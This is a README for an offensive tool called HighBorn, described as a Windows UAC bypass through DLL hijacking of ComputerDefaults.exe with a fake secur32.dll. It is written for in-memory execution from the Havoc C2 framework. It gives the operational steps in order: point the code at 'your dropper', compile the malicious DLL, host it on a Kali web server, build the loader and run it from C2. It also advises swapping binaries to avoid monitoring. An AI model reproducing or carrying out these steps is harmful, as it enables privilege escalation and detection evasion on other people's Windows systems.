Windows UAC Bypass utilizing mock directories and DLL Hijacking. This is a tool that I created to use with the "dotnet inline-execution" command on Havoc C2, but it can be used with any C2 that has in-memory execution. This was just a quick and dirty POC.

**Usage:**

Open the highborn.c file in a text editor on your Kali box.

Replace the file path with the file path of the executable that you want to open (ie your dropper).

Compile HighBorn.c into a dll.

**linux command: "x86_64-w64-mingw32-gcc -shared -o secur32.dll highborn.c -lcomctl32 -Wl,--subsystem,windows"**

Host the dll on your Kali box.

command: python3 -m http.server PORT

Compile on Kali

**apt install mono-complete -y
mcs -out:HighBorn.exe Highborn.cs**

Execute on C2

**command: dotnet inline-execute HighBorn.exe**

Replace the ComputerDefaults.exe and secur32.dll with other EXEs and DLLs as you find DLLs that can be hijacked. ComputerDefaults is a popular one so it is probably monitored pretty closely.
